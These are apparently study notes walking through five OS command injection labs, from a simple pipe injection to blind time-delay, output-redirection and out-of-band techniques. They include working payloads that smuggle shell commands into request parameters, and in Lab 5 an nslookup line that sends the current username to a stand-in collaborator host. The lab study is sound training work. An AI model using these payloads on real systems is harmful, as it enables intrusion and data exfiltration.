# OS Command Injection

### Lab 1: OS command injection, simple case.
- Intercept and modify a request that checks the stock.
- Modify the `storeID` parameter, giving it the value `1|whoami`.
- Observe that the response contains the name of the current user.

### Lab 2: Blind OS command injection with time delays.
- Intercept and modify the request that submits feedback.
- Modify the `message` parameter, changing it to `" & sleep 10 #`
- Observe that the response takes 10 seconds to return.

### Lab 3: Blind OS command injection with output redirection.
- Intercept and modify the request that submits feedback.
- Modify the `message` parameter, changing it to `" & whoami > /var/www/images/tmp.txt #`
- Intercept and modify the request that loads an image of a product.
- Modify the `filename` parameter, changing the value to the name of the file you specified for the output of the injected command: `tmp.txt`
- Observe that the response contains the output from the injected command.

### Lab 4: Blind OS command injection with out-of-band interaction.
- Run `Burp Collaborator` and copy its payload.
- Intercept and modify the request that submits feedback.
- Modify the `message` parameter, changing it to `" & nslookup BURP-COLLABORATOR-PAYLOAD #`
- On Burp Collaborator page, click on `Poll Now` to see the requests sent from the vulnerable page.

### Lab 5: Blind OS command injection with out-of-band data exfiltration.
- Run `Burp Collaborator` and copy its payload.
- Intercept and modify the request that submits feedback.
- Modify the `message` parameter, changing it to `" & nslookup $(whoami).BURP-COLLABORATOR-PAYLOAD #`
- On Burp Collaborator page, click on `Poll Now` to see the requests sent from the vulnerable page, and you can find the name of the user in the response.
